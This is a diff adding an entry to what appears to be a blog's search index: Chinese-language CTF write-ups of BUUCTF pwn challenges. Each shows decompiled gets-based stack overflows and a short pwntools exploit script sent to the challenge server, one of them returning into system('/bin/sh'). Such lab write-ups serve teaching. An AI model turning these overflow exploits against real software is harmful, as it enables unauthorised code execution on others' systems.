@@ -1,6 +1,69 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>pwn_buu</title>
+    <url>/2021/08/18/pwn-buu/</url>
+    <content><![CDATA[<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>nc连接，ls看到flag</p>
+<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><ol>
+<li><p>查看附件</p>
+<p>checksec pwn1</p>
+</li>
+</ol>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBafe58552c5dc3c2f7185d65bf6940fc5?method=download&shareKey=c3d513d247ac0a86d9c7419327f10eb6" alt="rip"></p>
+<ol start="2">
+<li><p>用IDA64打开</p>
+<p>找到main函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[15]; // [rsp+1h] [rbp-Fh] BYREF</span><br><span class="line"></span><br><span class="line">  puts(&quot;please input&quot;);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  puts(s);</span><br><span class="line">  puts(&quot;ok,bye!!!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>gets函数可造成缓冲区溢出,看见了fun()函数可利用,地址为0x401186</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int fun()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看gets中的参数长度0xf<br>由于环境Ubuntu18，写入参数的时候要加上一个retn地址，保持堆栈平衡</p>
+</li>
+<li><p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=remote(&#x27;node4.buuoj.cn&#x27;,27039)</span><br><span class="line">payload=&#x27;a&#x27;*(0xf+8)+p64(0x401185)+p64(0x401186)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><ol>
+<li><p>查看附件</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB282e14f82c36ea20652ed0e115da51a5?method=download&shareKey=42c87eaeb49033eb8c8a39a4e4314085" alt="warmup_csaw_2016"></p>
+</li>
+<li><p>用IDA64打开</p>
+<p>找到main函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char s[64]; // [rsp+0h] [rbp-80h] BYREF</span><br><span class="line">  char v5[64]; // [rsp+40h] [rbp-40h] BYREF</span><br><span class="line"></span><br><span class="line">  write(1, &quot;-Warm Up-\n&quot;, 0xAuLL);</span><br><span class="line">  write(1, &quot;WOW:&quot;, 4uLL);</span><br><span class="line">  sprintf(s, &quot;%p\n&quot;, sub_40060D);</span><br><span class="line">  write(1, s, 9uLL);</span><br><span class="line">  write(1, &quot;&gt;&quot;, 1uLL);</span><br><span class="line">  return gets(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>sub_40060D函数可得到flag，地址是0x40060D</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sub_40060D()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat flag.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过gets函数造成溢出，v5的大小为64</p>
+</li>
+<li><p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=remote(&#x27;node4.buuoj.cn&#x27;,26581)</span><br><span class="line">payload=&#x27;a&#x27;*(0x40+8)+p64(0x40060D)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><ol>
+<li><p>查看附件</p>
+<p>开了NX保护</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBde33fd1224a59bdd90e48abcc5677130?method=download&shareKey=c42577a49113810e1db1b38b57c83524" alt="ciscn_2019_n_1"></p>
+</li>
+<li><p>用IDA64打开</p>
+<p>看到main函数下的func()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int func()</span><br><span class="line">&#123;</span><br><span class="line">  char v1[44]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  float v2; // [rsp+2Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v2 = 0.0;</span><br><span class="line">  puts(&quot;Let&#x27;s guess the number.&quot;);</span><br><span class="line">  gets(v1);</span><br><span class="line">  if ( v2 == 11.28125 )</span><br><span class="line">    return system(&quot;cat /flag&quot;);</span><br><span class="line">  else</span><br><span class="line">    return puts(&quot;Its value should be 11.28125&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>gets函数v1参数的溢出，覆盖到v2，让v2的值为11.28125</p>
+<p>可以看出先传入0x30-0x04的字节给v1，剩下的0x04字节给v2，v2要以从浮点数转为16进制写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400676 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000400676</span><br><span class="line">.text:0000000000400676 ; Attributes: bp-based frame</span><br><span class="line">.text:0000000000400676</span><br><span class="line">.text:0000000000400676 ; int func()</span><br><span class="line">.text:0000000000400676                 public func</span><br><span class="line">.text:0000000000400676 func            proc near               ; CODE XREF: main+45↓p</span><br><span class="line">.text:0000000000400676</span><br><span class="line">.text:0000000000400676 var_30          = byte ptr -30h              //v1</span><br><span class="line">.text:0000000000400676 var_4           = dword ptr -4               //v2</span><br><span class="line">.text:0000000000400676</span><br><span class="line">.text:0000000000400676 ; __unwind &#123;</span><br><span class="line">.text:0000000000400676                 push    rbp</span><br><span class="line">.text:0000000000400677                 mov     rbp, rsp</span><br><span class="line">.text:000000000040067A                 sub     rsp, 30h</span><br><span class="line">.text:000000000040067E                 pxor    xmm0, xmm0</span><br><span class="line">.text:0000000000400682                 movss   [rbp+var_4], xmm0</span><br><span class="line">.text:0000000000400687                 mov     edi, offset s   ; &quot;Let&#x27;s guess the number.&quot;</span><br><span class="line">.text:000000000040068C                 call    _puts</span><br><span class="line">.text:0000000000400691                 lea     rax, [rbp+var_30]</span><br><span class="line">.text:0000000000400695                 mov     rdi, rax</span><br><span class="line">.text:0000000000400698                 mov     eax, 0</span><br><span class="line">.text:000000000040069D                 call    _gets</span><br><span class="line">.text:00000000004006A2                 movss   xmm0, [rbp+var_4]</span><br><span class="line">.text:00000000004006A7                 ucomiss xmm0, cs:dword_4007F4           //v2=11.28125的16进制   41348000h</span><br><span class="line">.text:00000000004006AE                 jp      short loc_4006CF</span><br><span class="line">.text:00000000004006B0                 movss   xmm0, [rbp+var_4]</span><br><span class="line">.text:00000000004006B5                 ucomiss xmm0, cs:dword_4007F4</span><br><span class="line">.text:00000000004006BC                 jnz     short loc_4006CF</span><br><span class="line">.text:00000000004006BE                 mov     edi, offset command ; &quot;cat /flag&quot;</span><br><span class="line">.text:00000000004006C3                 mov     eax, 0</span><br><span class="line">.text:00000000004006C8                 call    _system</span><br><span class="line">.text:00000000004006CD                 jmp     short loc_4006D9</span><br><span class="line">.text:00000000004006CF ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004006CF</span><br><span class="line">.text:00000000004006CF loc_4006CF:                             ; CODE XREF: func+38↑j</span><br><span class="line">.text:00000000004006CF                                         ; func+46↑j</span><br><span class="line">.text:00000000004006CF                 mov     edi, offset aItsValueShould ; &quot;Its value should be 11.28125&quot;</span><br><span class="line">.text:00000000004006D4                 call    _puts</span><br><span class="line">.text:00000000004006D9</span><br><span class="line">.text:00000000004006D9 loc_4006D9:                             ; CODE XREF: func+57↑j</span><br><span class="line">.text:00000000004006D9                 nop</span><br><span class="line">.text:00000000004006DA                 leave</span><br><span class="line">.text:00000000004006DB                 retn</span><br><span class="line">.text:00000000004006DB ; &#125; // starts at 400676</span><br><span class="line">.text:00000000004006DB func            endp</span><br></pre></td></tr></table></figure></li>
+<li><p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=remote(&#x27;node4.buuoj.cn&#x27;,29047)</span><br><span class="line">payload=&#x27;a&#x27;*(0x30-0x04)+p64(0x41348000)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>未完待续</strong></p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs</title>
     <url>/2021/07/06/sqli-labs/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
